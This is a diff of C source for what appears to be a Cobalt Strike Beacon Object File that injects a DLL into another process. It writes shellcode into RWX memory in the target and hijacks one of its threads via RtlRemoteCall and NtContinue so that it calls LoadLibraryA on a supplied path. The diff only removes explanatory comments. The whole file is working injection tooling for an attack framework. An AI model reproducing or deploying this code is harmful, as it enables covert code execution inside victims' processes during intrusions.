@@ -28,16 +28,13 @@ int FindThreadID(int pid){
 
 
 typedef struct _API_REMOTE_CALL {
-	// remote API call return value
 	size_t		retval;
 	
-	// standard function to call at the end of the shellcode
 	NtContinue_t ntContinue;
 	CONTEXT		context;
 	
-	// remote function to call - adjust the types!
 	LoadLibraryA_t ARK_func;
-	char		param1[100];				// LPCSTR
+	char		param1[100]; // LPCSTR
 	
 } ApiReeKall;
 
@@ -59,7 +56,6 @@ size_t MakeReeKall(HANDLE hProcess, HANDLE hThread, ApiReeKall ark) {
 					};
 	int prolog_size = sizeof(prolog);
 	
-	// resolve needed API pointers
 	RtlRemoteCall_t pRtlRemoteCall = (RtlRemoteCall_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlRemoteCall");
 	NtContinue_t pNtContinue = (NtContinue_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtContinue");
 	
@@ -68,45 +64,38 @@ size_t MakeReeKall(HANDLE hProcess, HANDLE hThread, ApiReeKall ark) {
 		return -1;		
 	}
 	
-	// allocate some space in the target for our shellcode
 	void * remote_mem = KERNEL32$VirtualAllocEx(hProcess, 0, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (remote_mem == NULL) {
 		BeaconPrintf(CALLBACK_ERROR, "Error allocating remote memory!\n");
 		return -1;
 	}
 	
-	// calculate the size of our shellcode
 	size_t sc_size = (size_t) SHELLCODE_END - (size_t) SHELLCODE;
 	
 	size_t bOut = 0;
 #ifdef _WIN64 
-	// first, write prolog, if the process is 64-bit
 	if (KERNEL32$WriteProcessMemory(hProcess, remote_mem, prolog, prolog_size, (SIZE_T *) &bOut) == 0) {
 		KERNEL32$VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
 		BeaconPrintf(CALLBACK_ERROR, "Error writing remote memory (prolog)!\n");
 		return -1;
 	}
 #else
-	// otherwise, ignore the prolog
 	prolog_size = 0;
 #endif
-	// write the main payload
 	if (KERNEL32$WriteProcessMemory(hProcess, (char *) remote_mem + prolog_size, &SHELLCODE, sc_size, (SIZE_T *) &bOut) == 0) {
 		KERNEL32$VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
 		BeaconPrintf(CALLBACK_ERROR, "Error writing remote memory (shellcode)!\n");
 		return -1;
 	}
 	
-	// set remaining data in ApiReeKall struct - NtContinue with a thread context we're hijacking
 	ark.retval = RETVAL_TAG;
 	ark.ntContinue = pNtContinue;
 	ark.context.ContextFlags = CONTEXT_FULL;
 	KERNEL32$SuspendThread(hThread);
 	KERNEL32$GetThreadContext(hThread, &ark.context);
 
-	// prepare an argument to be passed to our shellcode
 	ApiReeKall * ark_arg;
-	ark_arg = (ApiReeKall  *) ((size_t) remote_mem + sc_size + prolog_size + 4);		// align to 0x10
+	ark_arg = (ApiReeKall  *) ((size_t) remote_mem + sc_size + prolog_size + 4);
 	if (KERNEL32$WriteProcessMemory(hProcess, ark_arg, &ark, sizeof(ApiReeKall), 0) == 0) {
 		KERNEL32$VirtualFreeEx(hProcess, remote_mem, 0, MEM_RELEASE);
 		KERNEL32$ResumeThread(hThread);
@@ -114,7 +103,6 @@ size_t MakeReeKall(HANDLE hProcess, HANDLE hThread, ApiReeKall ark) {
 		return -1;		
 	}
 
-	// if all is set, make a remote call
 	NTSTATUS status = pRtlRemoteCall(hProcess, hThread, remote_mem, 1, (PULONG) &ark_arg, 1, 1);
 	if (status != 0) {
 		BeaconPrintf(CALLBACK_ERROR, "Failed RtlRemoteCall with status code: %x\n", status);
@@ -125,7 +113,6 @@ size_t MakeReeKall(HANDLE hProcess, HANDLE hThread, ApiReeKall ark) {
 	BeaconPrintf(CALLBACK_OUTPUT, "[+] Made successful remote RPC call with status code: %x\n[*] Wait for the RPC call to be triggered in the remote process..\n", status);
 	KERNEL32$ResumeThread(hThread);
 	
-	// get the remote API call return value
 	size_t ret = 0;
 	while(TRUE) {
 		KERNEL32$Sleep(1000);
@@ -155,7 +142,6 @@ void go(char *args, int len){
 		return -1;		
 	}
 	
-	// open both process and thread in the remote target
 	HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, 0, pID);
 	HANDLE hThread = KERNEL32$OpenThread(THREAD_ALL_ACCESS, 0, tID);
 	if (hProcess == NULL || hThread == NULL) {
@@ -164,7 +150,6 @@ void go(char *args, int len){
 	}
 	BeaconPrintf(CALLBACK_OUTPUT, "[+] Got handle to remote process and thread!\n");
 	
-	// prepare a ApiReeKall struct with a function to call
 	ApiReeKall ark = { 0 };
 	ark.ARK_func = (LoadLibraryA_t) GetProcAddress(LoadLibrary("kernel32.dll"), "LoadLibraryA");
 	MSVCRT$strcpy_s(ark.param1, 100, pathToDLL);
@@ -174,7 +159,6 @@ void go(char *args, int len){
 		BeaconPrintf(CALLBACK_OUTPUT, "[+] Received call confirmation. DLL should be loaded!\n", ret);
 	}
 
-	// cleanup
 	KERNEL32$CloseHandle(hThread);
 	KERNEL32$CloseHandle(hProcess);
 
